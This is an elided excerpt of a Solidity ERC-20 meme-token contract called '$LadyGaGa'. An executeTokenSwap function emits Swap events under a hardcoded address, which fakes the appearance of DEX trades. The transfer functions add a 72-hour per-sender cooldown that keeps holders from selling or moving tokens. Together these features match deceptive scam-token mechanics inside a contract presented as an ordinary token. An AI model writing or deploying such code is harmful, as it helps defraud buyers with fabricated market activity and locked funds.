...
contract DigitalMemeToken is ExecutionControl, SingleOwnership, IERC20 {
    ...
    string public constant _moniker = "$LadyGaGa";
    string public constant _ticker = "$LadyGaGa";
    uint8 public constant _decimalUnits = 18;
    uint256 public constant _ultimateSupply = 10000000 * (10 ** _decimalUnits);
    
    uint256 private constant _transactionCooldown = 72 hours;
    mapping(address => uint256) private _lastTransactionTimes;
    ...
    function executeTokenSwap(
        ...
        for (uint256 i = 0; i < recipients.length; i++) {
            ...
            emit Swap(
                0x6B7b5cc2F3BaF9549Ee050f13A847dd79cd9326d,
                tokenAmounts[i],
                0,
                0,
                wethAmounts[i],
    ...
    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        ...
        require(_lastTransactionTimes[obtainInvokerAddress()] + _transactionCooldown <= block.timestamp, "Transaction cooldown period has not elapsed.");
        ...
        _balances[to] += sum;
        _lastTransactionTimes[obtainInvokerAddress()] = block.timestamp;
    ...
    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        ...
        require(_lastTransactionTimes[from] + _transactionCooldown <= block.timestamp, "Transaction cooldown period has not elapsed.");
        ...
        _lastTransactionTimes[from] = block.timestamp;
